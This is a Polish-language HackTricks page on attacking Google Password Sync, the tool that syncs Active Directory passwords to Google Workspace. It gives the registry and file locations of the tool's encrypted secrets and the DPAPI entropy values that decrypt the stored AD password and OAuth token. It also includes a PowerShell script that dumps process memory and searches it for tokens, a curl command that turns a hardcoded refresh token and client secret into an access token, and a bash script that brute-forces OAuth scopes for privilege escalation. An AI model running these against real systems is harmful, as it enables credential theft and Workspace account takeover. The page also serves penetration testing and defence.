# GPS - Google Password Sync

{{#include ../../../banners/hacktricks-training.md}}

## Podstawowe informacje

To jest binarny plik i usługa, które Google oferuje w celu **synchronizacji haseł użytkowników między AD** a Workspace. Za każdym razem, gdy użytkownik zmienia swoje hasło w AD, jest ono ustawiane w Google.

Instalowane jest w `C:\Program Files\Google\Password Sync`, gdzie można znaleźć binarny plik `PasswordSync.exe` do jego konfiguracji oraz `password_sync_service.exe` (usługa, która będzie nadal działać).

### GPS - Konfiguracja

Aby skonfigurować ten plik binarny (i usługę), należy **przyznać mu dostęp do Super Admina w Workspace**:

- Zaloguj się za pomocą **OAuth** z Google, a następnie **zapisze token w rejestrze (szyfrowany)**
- Dostępne tylko w kontrolerach domeny z GUI
- Przekazanie **poświadczeń konta usługi z GCP** (plik json) z uprawnieniami do **zarządzania użytkownikami Workspace**
- Bardzo zły pomysł, ponieważ te poświadczenia nigdy nie wygasają i mogą być nadużywane
- Bardzo zły pomysł, aby dać SA dostęp do workspace, ponieważ SA może zostać skompromitowane w GCP i możliwe będzie przejście do Workspace
- Google wymaga tego dla kontrolowanych domen bez GUI
- Te poświadczenia są również przechowywane w rejestrze

Jeśli chodzi o AD, możliwe jest wskazanie, aby używało aktualnego **kontekstu aplikacji, anonimowego lub jakichś specyficznych poświadczeń**. Jeśli wybrano opcję poświadczeń, **nazwa użytkownika** jest przechowywana w pliku na **dysku**, a **hasło** jest **szyfrowane** i przechowywane w **rejestrze**.

### GPS - Zrzut hasła i tokenu z dysku

> [!TIP]
> Zauważ, że [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) jest w stanie wykryć **GPS**, uzyskać informacje o konfiguracji i **nawet odszyfrować hasło i token**.

W pliku **`C:\ProgramData\Google\Google Apps Password Sync\config.xml`** można znaleźć część konfiguracji, taką jak **`baseDN`** skonfigurowanego AD oraz **`username`**, których poświadczenia są używane.

W rejestrze **`HKLM\Software\Google\Google Apps Password Sync`** można znaleźć **szyfrowany token odświeżania** oraz **szyfrowane hasło** dla użytkownika AD (jeśli istnieje). Ponadto, jeśli zamiast tokenu używane są jakieś **poświadczenia SA**, można je również znaleźć zaszyfrowane w tym adresie rejestru. **Wartości** w tym rejestrze są dostępne tylko dla **Administratorów**.

Szyfrowane **hasło** (jeśli istnieje) znajduje się w kluczu **`ADPassword`** i jest szyfrowane za pomocą API **`CryptProtectData`**. Aby je odszyfrować, musisz być tym samym użytkownikiem, który skonfigurował synchronizację haseł i użyć tej **entropii** podczas korzystania z **`CryptUnprotectData`**: `byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };`

Szyfrowany token (jeśli istnieje) znajduje się w kluczu **`AuthToken`** i jest szyfrowany za pomocą API **`CryptProtectData`**. Aby go odszyfrować, musisz być tym samym użytkownikiem, który skonfigurował synchronizację haseł i użyć tej **entropii** podczas korzystania z **`CryptUnprotectData`**: `byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };`\
Ponadto jest również kodowany za pomocą base32hex z użyciem słownika **`0123456789abcdefghijklmnopqrstv`**.

Wartości entropii zostały znalezione przy użyciu narzędzia. Zostało skonfigurowane do monitorowania wywołań do **`CryptUnprotectData`** i **`CryptProtectData`**, a następnie narzędzie zostało użyte do uruchomienia i monitorowania `PasswordSync.exe`, które odszyfruje skonfigurowane hasło i token autoryzacji na początku, a narzędzie **pokaże wartości dla użytej entropii** w obu przypadkach:

<figure><img src="../../../images/telegram-cloud-photo-size-4-5782633230648853886-y.jpg" alt=""><figcaption></figcaption></figure>

Zauważ, że możliwe jest również zobaczenie **odszyfrowanych** wartości w wejściu lub wyjściu wywołań do tych API (w przypadku, gdy w pewnym momencie Winpeas przestanie działać).

W przypadku, gdy synchronizacja haseł została **skonfigurowana z poświadczeniami SA**, również będzie przechowywana w kluczach w rejestrze **`HKLM\Software\Google\Google Apps Password Sync`**.

### GPS - Zrzut tokenów z pamięci

Podobnie jak w przypadku GCPW, możliwe jest zrzucenie pamięci procesu `PasswordSync.exe` oraz procesów `password_sync_service.exe`, a będziesz w stanie znaleźć tokeny odświeżania i dostępu (jeśli zostały już wygenerowane).\
Myślę, że można również znaleźć skonfigurowane poświadczenia AD.

<details>

<summary>Zrzut <code>PasswordSync.exe</code> i procesów <code>password_sync_service.exe</code> oraz wyszukiwanie tokenów</summary>
```bash
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$processNames = @("PasswordSync", "password_sync_service")
$chromeProcesses = Get-Process | Where-Object { $processNames -contains $_.Name } | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}
```
</details>

### GPS - Generowanie tokenów dostępu z tokenów odświeżających

Używając tokena odświeżającego, możliwe jest generowanie tokenów dostępu przy użyciu tego tokena oraz identyfikatora klienta i tajnego klucza klienta określonych w następującym poleceniu:
```bash
curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
https://www.googleapis.com/oauth2/v4/token
```
### GPS - Zakresy

> [!NOTE]
> Zauważ, że nawet posiadając token odświeżający, nie można żądać żadnego zakresu dla tokena dostępu, ponieważ można żądać tylko **zakresów obsługiwanych przez aplikację, w której generujesz token dostępu**.
>
> Ponadto, token odświeżający nie jest ważny w każdej aplikacji.

Domyślnie GPS nie będzie miał dostępu jako użytkownik do każdego możliwego zakresu OAuth, więc używając poniższego skryptu możemy znaleźć zakresy, które można wykorzystać z `refresh_token`, aby wygenerować `access_token`:

<details>

<summary>Skrypt Bash do brutalnego wymuszania zakresów</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

A oto wynik, który otrzymałem w momencie pisania:
```
https://www.googleapis.com/auth/admin.directory.user
```
Który jest taki sam, jak ten, który otrzymujesz, jeśli nie wskażesz żadnego zakresu.

> [!CAUTION]
> Z tym zakresem możesz **zmodyfikować hasło istniejącego użytkownika, aby zwiększyć uprawnienia**.

{{#include ../../../banners/hacktricks-training.md}}
